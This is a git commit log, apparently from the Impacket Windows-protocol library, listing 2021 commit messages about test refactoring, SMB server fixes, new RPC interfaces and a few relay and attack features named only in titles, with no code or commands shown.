Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Sep 25 15:35:18 2021 +0300

    Update header format
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit cb84aaa28ec67bbd25403195c2de85f0a4db69dd
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Wed Sep 22 21:12:47 2021 +0300

    Implementing reg.py DELETE functionality.

commit c7bc76f8a726f04af9108d24b50f789e13f4688f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Sep 22 10:20:44 2021 -0300

    Changelog (#1159)
    
    * Using markdown and added all previous available releases in ChangeLog file.

commit c588e99e9c99d14fdfb9b365436a22371d8fc06f
Author: Gifts <GiftsUngiv3n@gmail.com>
Date:   Wed Sep 22 15:46:33 2021 +0300

    Implementing reg.py ADD functionality in order to be able to modify remote registry.
    Currently, modification of (Default) key is not implemented.

commit f057477633fa9caa269eb3ec1c41e2e20abadea1
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Sep 21 15:11:27 2021 -0300

    Removed some deprecation warnings (#1157)
    
    * Fixed warnings related to threading, that will start to appear in Pyhton 3.10, see https://docs.python.org/3.10/whatsnew/3.10.html#deprecated
    * Fixed warnings related to unrecognized escape sequences, see https://docs.python.org/3/reference/lexical_analysis.html#string-and-bytes-literals

commit 0297480bf2a4abfeb2ad63e15efb113f94a346e7
Merge: 5b4009ab b4957ae1
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Sep 17 16:17:43 2021 -0300

    Merge pull request #1133 from ShutdownRepo/kdctime
    
    Return server time in case of clock skew with KDC

commit 5b4009aba604d93cd397580e92165e0184e74e75
Merge: 50c76958 ee86a6d6
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Sep 17 15:22:56 2021 -0300

    Merge pull request #1153 from exploide/getST-typo
    
    getST.py: fixed wrong example in usage output

commit ee86a6d606ac07906bc05a33ab75058e10bb8fef
Author: exploide <me@exploide.net>
Date:   Mon Sep 13 12:20:23 2021 +0200

    getST.py: fixed wrong example in usage output

commit 50c76958706577a5005bec2ee1fda9e9fa669a65
Merge: 5aa97fa7 db758f1b
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Sep 6 17:58:40 2021 -0300

    Merge pull request #1146 from LZD-TMoreggia/master
    
    Support HTTP WWW-Authenticate: Negotiate

commit db758f1b6acaebd37f55991abd2f8bdcb988b74b
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Mon Sep 6 17:48:49 2021 +0800

    Update httprelayclient.py
    
    Always return a value from sendNegotiate.

commit 5c25bab4fd71f300c374fdf7aa4670be2bcfb85f
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Jan 31 03:18:26 2021 +0300

    fix typos

commit 29bf6d2cdb8c97037ab2b6fa9785f8188f11b0f4
Author: Roman Maksimov <r.l.maksimov@gmail.com>
Date:   Sun Jan 31 03:17:30 2021 +0300

    remove unnecessary check

commit 83fcc47e6a159bc439980c9874dc716f93a1280c
Merge: 1eb4ef30 1893ce7f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 13:15:27 2021 -0700

    Merge branch 'test-refactor' into test-refactor-py310

commit 1893ce7f96d5b616303473e21fdbea946fb55899
Merge: fac17201 c348d94b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 11:19:27 2021 -0700

    Merge branch 'test-refactor' of https://github.com/SecureAuthCorp/impacket into test-refactor

commit fac172018fddd066955154156cd6378c4348f8d3
Merge: c39fc6e4 5aa97fa7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 11:17:17 2021 -0700

    Merge branch 'master' into test-refactor

commit c348d94b0f275db449906fad27ab9434c8c3ff90
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Sep 3 15:15:31 2021 -0300

    Tests: Refactor DCE/RPC endpoints test cases (#1151)
    
    Main changes are:
    * Moved DCE/RPC endpoints test cases to a separate folder to better match code layout
    * Using a base class for test cases to abstract code and reduce reuse
    * Improved some of the tests cases to avoid code duplication
    * Marking and skipping tests cases known to be failing

commit 5aa97fa704ab88646f0bd9b814bedb2ba6368892
Merge: 29f7217e def1f7c7
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Aug 27 16:29:57 2021 -0300

    Merge pull request #1147 from SecureAuthCorp/smbserver-fixes
    
    SMBServer: Big review, fixes and improvements

commit 29f7217e39c07820000f5378cdb192fb2fbbac89
Merge: 358fc7c6 4419d125
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Aug 27 10:17:29 2021 -0300

    Merge pull request #1136 from mohemiv/http-fix
    
    Complying MS-RPCH with HTTP/1.1

commit def1f7c78eb4f5d2d0accb6953b1f0e4340c6119
Merge: 863b3c8d 1636eaab
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Aug 26 10:32:29 2021 -0700

    Merge branch 'master' into smbserver-fixes

commit d593450fcc0e6c9627d494729551c1270ef540ee
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Thu Aug 26 13:15:54 2021 +0800

    Use NTLM if available

commit 56acc51fec71cc7d951a0f05571db5ba49409409
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Thu Aug 26 13:03:54 2021 +0800

    Remove stuff not yet in master

commit 7f939e8f865bdd5ac5cf578d276bf0536fffbce3
Author: LZD-TMoreggia <79073462+LZD-TMoreggia@users.noreply.github.com>
Date:   Thu Aug 26 13:01:15 2021 +0800

    Do NTLM auth when server advertise Negotiate
    
    WWW-Authenticate: Negotiate should accept NTLM auth, only the headers change. Tested on ADCS only.

commit 863b3c8de0255b0fc33ec213f26f11bf9c664438
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Aug 11 15:08:09 2021 -0700

    SMBServer: Adding missing info level and fixed structure
    
    This adds a missing Reserved field specified in [MS-FSCC] 2.4.19 and handles some SMB2 info levels that were missing as well. Should help fixing #1093.

commit 730a2c4976bc538473ca563436a0cb45ac1b6cc1
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Aug 11 16:58:47 2021 -0300

    SMBServer: Improved file and path name handling in queryFileInformation & queryPathInformation.

commit b43001875e283d679dfa31cc3cc70ca7d3cd1392
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Aug 11 11:24:46 2021 -0700

    SMBServer: Fixed directory file attribute on SMB2_FILE_ALL_INFO

commit 51cd77bd0cc6fd66564a337647c03deec6e548da
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Aug 9 20:54:18 2021 -0300

    SMBServer: Enabled SMB_COM_FLUSH method
    
    * It should fix #714

commit ee3b178d91f51c52ed60a186acf00afe17e72f2f
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Aug 9 20:49:33 2021 -0300

    SMBServer: Added SMB2 support to QUERY_INFO Request (SMB2_0_INFO_FILE)
    
    * It should fix #1094

commit 7cd166bfab58f220e122487b356122ffc8c27271
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Aug 2 10:19:13 2021 -0700

    SMB Client: Handling empty search count in FindFileBothDirectoryInfo
    
    Better handle the case when SMB_FIND_FILE_BOTH_DIRECTORY_INFO returns and empty list of items.

commit 0bf5f0515bbab40c65de7b53ab41a2e4d58b24dc
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 30 14:53:18 2021 -0700

    SMBServer: Added missing query information levels
    
    * Added missing const and structure for the QUERY_FS Information Level SMB_QUERY_FS_DEVICE_INFO. This is part of #1093.
    * Handling missing SMB2 query info level SMB2_FILE_STANDARD_INFO

commit 7bf33024bbbe2466501f8d226225b968aab5be43
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jul 29 08:08:09 2021 -0700

    SMBServer: Various fixes and improvements
    
    * Harness unit and functional tests, covering more operations
    * Added test for unicode filenames #878
    * Added test for unicode username #700
    * Added TID checks
    * Hardened path checks:
      * Added a normalize_path function
      * Using isInFileJail across operations
    * Added close method to avoid address reuse in tests

commit 1eb4ef30b223655e8d21ecdbefe5c113d6eca312
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Aug 17 13:22:48 2021 -0700

    Tests: Remove pytest freeze version

commit c3c4fe6faa5271b40555e5eadbb09eda0e7b8bec
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Aug 17 12:59:40 2021 -0700

    Tests: Added Python 3.10 rc to GH Actions workflow

commit 5fd22878b4d57a5a5e0a22ed1faa1b8afe9acd9b
Merge: da1d5640 358fc7c6
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Sun Aug 15 20:08:03 2021 +0200

    Merge branch 'master' into ntlmrelayx-adcs-attack

commit da1d5640fecd0d8f70b1f3ba5f345f3dd7845944
Merge: 5f1ced6d ed9fd5aa
Author: ExAndroidDev <80745365+ExAndroidDev@users.noreply.github.com>
Date:   Sun Aug 15 19:41:54 2021 +0200

    Merge pull request #1 from Tw1sm/ntlmrelayx-adcs-attack
    
    Fix when cert server does not request NTLM auth

commit 358fc7c6be8488f24fa900220b4f2a82901b5774
Merge: 1636eaab c9e81999
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Sat Aug 14 00:56:40 2021 -0300

    Merge pull request #1141 from skelsec/master
    
    major speedup for ntds parsing

commit c9e8199909e51b0a6c358cf2a1e113b5a7c7ba47
Author: skelsec <info@skelsec.com>
Date:   Wed Aug 11 12:48:58 2021 +0200

    adding peklist to global filter

commit b73c54b39e6861947f81ecb59bf2b75f9e9cf12d
Author: skelsec <info@skelsec.com>
Date:   Wed Aug 11 00:25:07 2021 +0200

    2x speedup for ntds.dit parsing

commit ed9fd5aade3b3d1e60c009cd9765cf15d019ea66
Author: Tw1sm <mcreel31@gmail.com>
Date:   Wed Aug 4 10:08:55 2021 -0400

    prevent replay of already attacked clients

commit 2b7493809fc4ab235080e6d72b21259080e6ed4b
Author: tw1sm <mcreel31@gmail.com>
Date:   Wed Aug 4 00:20:08 2021 -0400

    Send auth even if not requested by cert server

commit 4419d1255108f8e7acb6ce5d17a7a13857d83703
Author: Arseniy Sharoglazov <mohemiv@users.noreply.github.com>
Date:   Mon Aug 2 21:29:37 2021 +0300

    Complying MS-RPCH with HTTP/1.1

commit b4957ae1ff2cc1cfe091d9ab4a677dd0f3f380c9
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Mon Aug 2 13:26:47 2021 +0200

    Moving code out of direct if loop
    Co-authored-by: pixis <hackndo@gmail.com>

commit 9d2655f994aa55a51cdbacb263ab4a444125fa63
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Fri Jul 30 19:46:16 2021 +0200

    Trying to add hackndo to the authors
    
    Co-authored-by: pixis <hackndo@gmail.com>

commit 1a67bfafdb177c1bcddb9651bea8b88b95cd7c33
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Fri Jul 30 19:25:46 2021 +0200

    Returns server time in case of KRB_AP_ERR_SKEW

commit 8f67e44bfa707e5b90318dc1a23bf12cc3390e35
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Jul 30 16:42:41 2021 +0300

    Add more 'password expired' exception checks

commit c39fc6e48c26afef32889616d8b7ffb0cdea5481
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jul 29 12:37:30 2021 -0300

    Tests: Simplify remote configuration (#1131)
    
    * Merged TCP and SMB transport configuration into only one.
    * Abstracted remote configuration parsing routines into functions.
    * Remote config file can now be specified as pytest option.
    * Added some notes on testing guide.

commit 5f1ced6d91c4123e30155facbfdab82b0cd46ad0
Merge: 2ace5639 1636eaab
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Tue Jul 27 16:38:08 2021 +0200

    Merge branch 'master' into ntlmrelayx-adcs-attack

commit 1636eaab69eb3b62399db76d12f552ecebb710d0
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon Jul 26 18:01:01 2021 -0300

    dpapi.py: Updated description and copyright year.

commit 8f2cdef322516dec196c5defa5a68bd4d4d4f4a1
Merge: cd4fe47c 06af814e
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jul 26 17:40:39 2021 -0300

    Merge pull request #1073 from w0rmh013/master
    
    Fixed wrong Enum type when dumping credential blob

commit eb884d8e3dd20a1d6daa56ac1abfced41ecc4a46
Merge: 2d323838 0b4a759f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 23 11:15:57 2021 -0300

    Merge pull request #1125 from SecureAuthCorp/test-refactor-assert
    
    Tests: Refactors to some tests

commit 0b4a759fb8ca414da2270b1af668d4ba8b5254b8
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 21 14:24:17 2021 -0700

    Tests: Refactors to some tests
    
    * Moved binary hashes to base class
    * Using assertEqual instead of assertTrue when possible
    * Fixed a couple of bad assertions

commit 51b66c71b3ea8538176dcffac665bbbfef5ebfb5
Merge: 2d323838 cd4fe47c
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue Jul 20 06:57:48 2021 -0700

    Merge branch 'master' into test-refactor-catchup

commit cd4fe47cfcb72d7d35237a99e3df95cedf96e94f
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 7 12:27:31 2021 -0700

    Arrange tagline, copyright and license notes across all source files
    
    This was a pending change to:
    - Use the same tagline, copyright and license notice across files.
    - Remove authors' contacts that are no longer valid (due to affiliation changes).
    - Update repository location.
    - Update license file with missing licenses (althought those were already in source files).
    
    This doesn't include any change on the source code, nor any change on current copyright or licenses. Just formatting and phrasing to make our and distro's maintainers life easier.

commit 2d3238381179d426ed3b33139d39f445f71af113
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 16 10:44:12 2021 -0300

    Tests: Refactored configuration of remote test cases (#1122)
    
    Refactored configuration to avoid duplicated code.
    
    Main changes are:
    * Moved AES keys config to base class
    * Moved hash split to base class
    * Made machine hashes parameters optional
    * Made AES keys parameters optional
    * Updated testing guide

commit e4483d46254c33ff0d25f6a5667d5a0964ecc191
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Jul 9 21:00:54 2021 +0300

    Fix options parsing for a local account

commit 8a344ff2cd5bfc89b34110c3a5cd0ddcdffb1878
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Fri Jul 9 16:11:58 2021 +0300

    Allow to use NTLM hashes as a new password value

commit 6cfe404f816a7651b766c9176046e461d477dcfc
Merge: 6bb5ea42 b3a608eb
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jul 8 12:15:14 2021 -0300

    Merge pull request #1118 from SecureAuthCorp/test-refactor-warnings
    
    Tests: Removed test files PEP8 warnings

commit b3a608eb35e26f9fbb0cb31908790a82641c756b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 7 18:26:09 2021 -0700

    Tests: Removed test files PEP8 warnings

commit d479c1c9da1900fac6c9feaae09cd14db0cf599d
Merge: 6bb5ea42 6da655ca
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jul 7 16:42:29 2021 -0700

    Merge branch 'master' into test-refactor-catchup

commit 6da655ca9ac4f9c2a207ea47e79d089044accd78
Merge: 4821d64e 29ad5792
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Jul 6 14:02:17 2021 -0300

    Merge pull request #1114 from cube0x0/master
    
    Added [MS-PAR]: Print System Asynchronous Remote Protocol

commit 29ad57929b9a798b80b8f51bcd155fe99f18ac7f
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Sun Jul 4 16:20:46 2021 +0200

    MS-PAR initial

commit 4821d64e3a078a79e60c0b03f08d0984d9a17728
Merge: 0efdf7c0 73b9466c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jul 2 18:30:28 2021 -0300

    Merge pull request #1109 from cube0x0/master
    
    Added everything need for calling RpcAddPrinterDriverEx

commit 0efdf7c03737152f80c85f3b990df548c651baee
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jul 2 18:26:37 2021 -0300

    smbserver.py: Added NULL SMBv2 client connection handling
    
    It fixes #1048

commit 3c943ca5ae342e1288245fd1c79430cdff61602c
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri Jul 2 18:23:33 2021 -0300

    Define flag NTLMSSP_NEGOTIATE_ANONYMOUS

commit 6bb5ea427b8b11bd8d93355939654a293575a470
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jul 2 12:22:14 2021 -0300

    Tests: Continue refactor of test cases (#1112)
    
    Continue refactor some of our test cases structure.
    
    Main changes introduced are:
    * Moved testing guide as a separate file and added some of the steps to configure the test environment.
    * Leveraging unittest.main to catch command-line args and build the default suite.
    * Only running GitHub actions workflow once for our own branches/PRs.
    * Remote test config file can be specified via an env var now.
    * Moved remote test config to a template and ignored config file.

commit 73b9466c17761384ece11e1028ec6689abad6818
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Wed Jun 30 10:05:36 2021 -0400

    added RpcEnumPrinterDrivers

commit f43cf082c825676e22657ab534a53e4da2f3ca50
Author: cube0x0 <39370848+cube0x0@users.noreply.github.com>
Date:   Tue Jun 29 12:53:15 2021 -0400

    Add files via upload

commit b08473b7a2dc9d48ca7d7e931ceaf1fa548cdc47
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Tue Jun 29 17:54:21 2021 +0200

    Added rbcd attack script

commit 142cacb649b8c6441df9330ac22fe4d15a0d1bbc
Merge: 94881a6b f1896d22
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Jun 29 12:35:13 2021 -0300

    Merge pull request #1074 from franferrax/master
    
    WMI objects minor refactors, fixes, and offline parsing tests

commit de0bfa4352a448cec1ff494186c54b353d33c640
Author: Brandon Forbes <reznok@gmail.com>
Date:   Mon Jun 28 20:00:52 2021 -0700

    Update KeyBlock name

commit b8c8f9cc3e9f211dd31d6851f0c30faf7cb3f537
Author: Brandon Forbes <reznok@gmail.com>
Date:   Mon Jun 28 19:58:40 2021 -0700

    Add support for V3 ccache

commit 94881a6b626f5e3801033a57a6c5a85a6ade768a
Merge: 2eff99fc 442fac97
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Jun 28 15:42:37 2021 -0300

    Merge pull request #1095 from deadjakk/master
    
    Added 'mget' to smbclient.py

commit 9170de2d3d9f966871136f54d22cea2f79fdca10
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Jun 28 15:26:42 2021 -0300

    Tests: Moving flake8 steps to a separate job so we fail early and don't repeat (#1105)

commit 442fac9765d5da85f706e4cfc8eef5246a2c0475
Author: deadjakk <deadjakk@shell.rip>
Date:   Sat Jun 26 12:22:59 2021 -0500

    updated copyright year to 2021

commit 40f93aa8900b918f925993a14a066849bc8b219c
Author: deadjakk <30613497+deadjakk@users.noreply.github.com>
Date:   Sat Jun 26 12:23:16 2021 -0500

    Update impacket/examples/smbclient.py
    
    Omit directories from downloads
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 2eff99fc737df3dfba5b3b14651c5560cc5fdf2c
Merge: 11f43043 b81e07eb
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Jun 25 15:03:49 2021 -0300

    Merge pull request #1096 from SecureAuthCorp/pip-install
    
    Setup: Using proper pip calls

commit 658e0ab8e1d3b0b738439e67a7ad1c8f4b73f661
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 25 11:19:52 2021 -0300

    Tests: First batch of changes on refactoring test cases (#1102)
    
    Tests: First batch of changes on refactoring test cases
    
    This is the first part of a larger effort to refactor some of our test cases structure.
    
    Main changes introduced are:
    - Using pytest as the testing framework to organize and mark test cases.
    - Replacing custom bash scripts with test cases discovery.
    - Integrating pytest-cov plugin to easier coverage collection and reporting.
    - Marking remote test cases to being able to pick those during run.
    - Abstracted remote test cases configuration in a base class.
    - Consolidating pytest, coverage and tox configuration in a single tox.ini file.
    - Removed some Python 2.5 support and replaced custom compat checks with six.
    - Replace unittest.TextTestRunner.run by unittest.main (cherry-picked from f5dab5ca76b60b9436f18d1ba5fd48abfa3626e1, thanks @franferrax !)

commit 2ace5639a1470341ba048f9376fd6303b49c5b51
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Wed Jun 23 19:13:37 2021 +0200

    Removed leftover print function

commit 81afc66904068e33c866bc9d005262c9ce69bad6
Author: ExAndroidDev <exandroiddev@protonmail.com>
Date:   Tue Jun 22 21:42:26 2021 +0200

    AD CS relay attack implementation

commit 11f430437d87f432fa404bffcf803b1e27ad0ca2
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 18 05:48:10 2021 -0700

    Tests: PEP8 format on misc tests
    
    Made some PEP8 arrangements on misc unit tests modules

commit d659b7898b93040dd86f17032272f2b64f0c181e
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 18 05:36:34 2021 -0700

    Tests: Adding coverage on passwords with @
    
    We were missing the case when passwords had one or more '@' characters.

commit b81e07eb578ad0cff2474f52b6a9a90209ccbb10
Merge: fd893934 1a5ed9dc
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Jun 16 08:34:24 2021 -0700

    Merge branch 'master' into pip-install

commit 1a5ed9dc2160c154c851e85066dfb72882f5a473
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Jun 11 07:25:16 2021 -0700

    Clarified disclaimer and added security policy file.

commit fd893934e11304c9330ff74b14792e0e8e4f8009
Merge: 3fe60884 90ce4b7d
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Jun 10 12:52:18 2021 -0700

    Merge branch 'master' into pip-install

commit 88a913d667f197888455d0429f087e05b2b454f3
Author: deadjakk <deadjakk@shell.rip>
Date:   Wed Jun 9 15:37:20 2021 -0500

    added error output  for empty mask

commit 9d3e92d25f2fe56ae825b16a83f164d0ba2f51bd
Author: deadjakk <deadjakk@shell.rip>
Date:   Wed Jun 9 15:22:09 2021 -0500

    added 'mget' to smbclient.py to allow for downloading of multiple files, much like the 'mget' command of smbclient(1)'

commit f1896d227994fa49fef9ecf45146fb8a929ed400
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 14:54:04 2021 -0300

    Fix WMI persist 'obscure' issue described in #1069 comment
    
    This partially restores the behavior prior to https://github.com/SecureAuthCorp/impacket/commit/fc466d16308797f7f59be92e294b02209156ceea#diff-626e3c8919e12e361f23696811214b85ba9fa2af78cce5c2f2b6a9d84a5d95e8L2416-R2431. Before these changes, we were the setting the inherited_default flag. After them, we were setting null_default instead. With this one, we are setting both.
    
    Further information and steps to reproduce in https://github.com/SecureAuthCorp/impacket/pull/1069#issuecomment-835179409. Additionally, a workaround is provided there, just in case this change isn't the preferred way to approach the issue.

commit f5749ec9da5ad9c34613c417f257e98b8c5ad768
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 14:16:40 2021 -0300

    Uniformize NullAndDefaultFlag names
    
    Rename default_value_is_null to null_default and default_value_is_inherited to inherited_default, so we don't use different names for the same thing. This aligns the names between d0d5ad5e940129847b9330773d722040ed6b1bb2 and b1499ae82242be2002dd2790ab5691c27c6c5962.
    
    Please note that these flags have no official name in https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/ed436785-40fc-425e-ad3d-f9200eb1a122.

commit e82af931328ddd0daa7998f0a3f4138d6f404c38
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 13:14:38 2021 -0300

    Limit previous fixes to number types
    
    New implemented tests have failed (see below), this change limits b1499ae82242be2002dd2790ab5691c27c6c5962 & bc57bf7404a5821efc82887d0bed083c52f9b4d0 fixes to number types (integers, booleans, floating point), which are read directly from the entry in ENCODED_VALUE.getValue(), without using the heap.
    
    I've also took advantage to make INSTANCE_TYPE.processNdTable() private.
    
    Failures:
    PY2: https://github.com/franferrax/impacket/runs/2785544033#step:7:254
    PY3: https://github.com/franferrax/impacket/runs/2785544159#step:7:272

commit a9e7b647b2d5322ad00a337574eb25663f6b5b9e
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 13:00:17 2021 -0300

    Revert #1069 fix
    
    As explained in f9514ee36d3f0d74235603d044db8774457ac882, #1069 fix is no longer needed after b1499ae82242be2002dd2790ab5691c27c6c5962 & bc57bf7404a5821efc82887d0bed083c52f9b4d0 changes

commit f9514ee36d3f0d74235603d044db8774457ac882
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Wed Jun 9 12:54:16 2021 -0300

    Create offline test parsing wmipersist.py objects
    
    Create self.createIWbemClassObject() helper to avoid duplicating logic. It also uses wmi.INTERFACE as a wmi.IWbemServices mock (this is enough for our testing purposes).
    
    This test also shows that #1069 fix is no longer necessary, since `DeliveryQoS` is zero after b1499ae82242be2002dd2790ab5691c27c6c5962 & bc57bf7404a5821efc82887d0bed083c52f9b4d0 changes.
    
    It should fail due to splash damage of the aforementioned changes. Upcoming fix...

commit 90ce4b7d0b1ee4f258927e26035e4bca0e43b7ca
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 9 12:10:58 2021 -0300

    And going back to dev version

commit 090cf0cc92f6da1a3efe366230d94608a265deba
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Wed Jun 9 11:18:18 2021 -0300

    About to tag a release

commit 8849e5ad177444651af50f574c4618b49ea3bfb9
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 13:44:28 2021 -0300

    Minor adjustments in test_win32_current_time_class_parsing
    
    Invert expected and actual values order in assertEqual(), according with PyCharm's unittest runner interpretation of failures.
    
    Avoid sample patching code to be considered by PyCharm's unittest runner as an example to be run.

commit f5dab5ca76b60b9436f18d1ba5fd48abfa3626e1
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 02:43:53 2021 -0300

    Replace unittest.TextTestRunner.run by unittest.main
    
    In this way, tests return the execution status to the OS shell, making the tox run fail and report failures in GitHub (hopefully)

commit bc57bf7404a5821efc82887d0bed083c52f9b4d0
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 02:21:21 2021 -0300

    Adapt changes for Python 3
    
    Adapt b1499ae82242be2002dd2790ab5691c27c6c5962 changes to run both in Python 2 and 3

commit b1499ae82242be2002dd2790ab5691c27c6c5962
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 01:47:31 2021 -0300

    Parse the NdTable when getting object properties
    
    As suggested in d757c3a402e59c9c6e01d6a457a10af4dec836f3, parse the NdTable to decide whether a zero value is actually a zero integer or a null default. For further information about the NdTable, visit https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/65bcd0c2-b3f3-49a7-b4aa-c972cdc0774b from the [MS-WMIO] open specification.
    
    This fixes the test implemented in c511b6ff051fa55abed5eb1920b3fb08d2647785, failure sample:
    https://github.com/SecureAuthCorp/impacket/pull/1074/checks?check_run_id=2770395932#step:7:240

commit b68c35dced8ec4db5b54e893258bd23c72844ef4
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Tue Jun 8 01:29:12 2021 -0300

    Execute offline WMI tests in continuous integration system

commit c511b6ff051fa55abed5eb1920b3fb08d2647785
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Mon Jun 7 23:12:25 2021 -0300

    Add offline WMI test for Win32_CurrentTime parsing
    
    This test checks the result of the following WMI query
    when the target's time contains zeroes in its fields
    
    Select * from Win32_UTCTime

commit 25c62f65a420e7ce3541c9099e32e91f6e9d3bd9
Merge: 8aa5626a be3d9903
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri May 28 19:52:32 2021 -0300

    Merge pull request #1088 from SecureAuthCorp/pr-605-catchup
    
    Add silent command

commit be3d9903a82f483f9b934e4ae413bb82b1aaa276
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Fri May 28 19:44:14 2021 -0300

    Update help section

commit 8aa5626a8947754cb1d09ede083f8c31bde08269
Merge: 0d3a6143 6c74308c
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri May 28 16:27:10 2021 -0300

    Merge pull request #1086 from p0dalirius/get-gpppasswords-add-single-xml-file-parsing
    
    Get gpppasswords add single xml file parsing

commit 6c74308cf61b17d78776e43725efaab9e7c466b5
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri May 28 09:41:12 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 84cdc9d15ce6595e362c4e524b6a6804513a00dc
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Fri May 28 09:41:03 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 3fe60884046ecc410e7fbfd23af1f3ddacdd89dc
Merge: e7261617 2f5c2476
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu May 27 16:04:28 2021 -0700

    Merge branch 'master' into pip-install

